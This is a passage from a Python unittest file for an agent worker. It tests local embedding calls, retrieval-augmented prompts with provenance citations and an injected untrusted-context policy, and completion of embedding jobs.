        self.assertEqual(final_messages[-1]["tool_call_id"], "call-2")


class LocalKnowledgeTests(unittest.TestCase):
    def test_calls_openai_compatible_embeddings_and_restores_index_order(self) -> None:
        client = LocalModelClient("http://127.0.0.1:11434/v1", "ollama")
        payload = json.dumps(
            {
                "object": "list",
                "data": [
                    {"object": "embedding", "index": 1, "embedding": [0.0, 1.0]},
                    {"object": "embedding", "index": 0, "embedding": [1.0, 0.0]},
                ],
                "model": "embeddinggemma",
            }
        ).encode("utf-8")
        with patch("agat_worker.urllib.request.urlopen", return_value=_FakeResponse(payload)) as open_url:
            vectors = client.embed("embeddinggemma", ["first", "second"])

        self.assertEqual(vectors, [[1.0, 0.0], [0.0, 1.0]])
        request = open_url.call_args.args[0]
        self.assertEqual(request.full_url, "http://127.0.0.1:11434/v1/embeddings")
        self.assertEqual(json.loads(request.data), {
            "model": "embeddinggemma",
            "input": ["first", "second"],
        })
        self.assertEqual(request.headers["Authorization"], "Bearer ollama")

    def test_injects_provenance_and_untrusted_context_policy(self) -> None:
        coordinator = _FakeKnowledgeCoordinator()
        client = _RagModelClient(coordinator)
        lease = {
            "leaseId": "stage-lease-1",
            "agent": {
                "name": "Researcher",
                "systemPrompt": "Answer precisely.",
                "model": None,
                "runtime": "single",
            },
            "run": {"name": "Privacy", "input": "Where is customer data stored?"},
            "context": [{"agentName": "Collector", "output": "Use the handbook."}],
            "knowledge": {
                "groups": [{
                    "embeddingModel": "embeddinggemma",
                    "collectionIds": ["collection-1"],
                    "topK": 4,
                }],
                "memory": [{
                    "id": "memory-1",
                    "kind": "working",
                    "content": "The operator selected the privacy handbook.",
                }],
            },
        }

        output = client.complete(lease, "qwen3:8b")

        self.assertEqual(output, "Data is local [K1].")
        self.assertEqual(len(coordinator.searches), 1)
        self.assertEqual(coordinator.searches[0]["leaseId"], "stage-lease-1")
        self.assertEqual(coordinator.searches[0]["queries"][0]["vector"], [1.0, 0.0])
        messages = client.requests[0]
        self.assertIn("недоверенные данные", messages[0]["content"])
        self.assertIn("[K1] Product handbook · agat://handbook/privacy", messages[1]["content"])
        self.assertIn("Customer data remains on the local deployment.", messages[1]["content"])
        self.assertIn("[M1]", messages[1]["content"])

    def test_completes_embedding_job_with_chunk_provenance(self) -> None:
        coordinator = _FakeKnowledgeCoordinator()
        client = _RagModelClient(coordinator)
        lease = {
            "leaseId": "embedding-lease-1",
            "collection": {"embeddingModel": "embeddinggemma"},
            "document": {"name": "Handbook"},
            "chunks": [
                {"id": "chunk-1", "content": "First fact"},
                {"id": "chunk-2", "content": "Second fact"},
            ],
        }

        execute_knowledge_lease(
            coordinator,  # type: ignore[arg-type]
            client,
            lease,
            dry_run=False,
        )

        self.assertEqual(coordinator.failed, [])
        self.assertEqual(coordinator.completed, [{
            "leaseId": "embedding-lease-1",
            "embeddings": [
                {"chunkId": "chunk-1", "embedding": [1.0, 0.0]},
                {"chunkId": "chunk-2", "embedding": [1.0, 0.0]},
            ],
        }])


if __name__ == "__main__":
    unittest.main()
